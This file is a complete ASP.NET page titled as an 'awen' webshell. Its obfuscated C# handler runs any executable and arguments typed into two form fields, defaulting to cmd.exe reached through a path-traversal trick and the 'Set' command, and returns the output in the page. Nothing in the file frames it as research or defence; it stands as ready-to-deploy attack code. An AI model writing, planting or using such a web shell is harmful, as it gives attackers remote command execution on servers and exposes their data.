<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<script Language="c#" runat="server">
protected void FbhN(object sender,EventArgs e)
{
try
{
Process ahAE=new Process();
ahAE.StartInfo.FileName=kusi.Value;
ahAE.StartInfo.Arguments=bkcm.Value;
ahAE.StartInfo.UseShellExecute=false;
ahAE.StartInfo.RedirectStandardInput=true;
ahAE.StartInfo.RedirectStandardOutput=true;
ahAE.StartInfo.RedirectStandardError=true;
ahAE.Start();
string Uoc=ahAE.StandardOutput.ReadToEnd();
Uoc=Uoc.Replace("<","&lt;");
Uoc=Uoc.Replace(">","&gt;");
Uoc=Uoc.Replace("\r\n","");
tnQRF.Visible=true;
tnQRF.InnerHtml="<hr width=\"100%\" noshade/><pre>"+Uoc+"</pre>";
}
catch(Exception error)
{
Response.Write(error.Message);
}
}
</script>
<HTML>
<HEAD>
<title>awen **.**.**.** webshell</title> 
</HEAD>
<body >
<form id="cmd" method="post" runat="server"> 
<div runat="server" id="vIac">
 <p>path:
 <input class="input" runat="server" id="kusi" type="text" size="100" value="c:\windows\Microsoft.NET\Framework\v1.1.4322\csc.exe\..\..\..\..\system32\cmd.exe"/>
 </p>
command:
 <input class="input" runat="server" id="bkcm" value="/c Set" type="text" size="100"/> <asp:Button ID="YrqL" CssClass="bt" runat="server" Text="Submit" OnClick="FbhN"/>
 <div id="tnQRF" runat="server" visible="false" enableviewstate="false">
 </div>
</div>
</form>
</body>
</HTML>
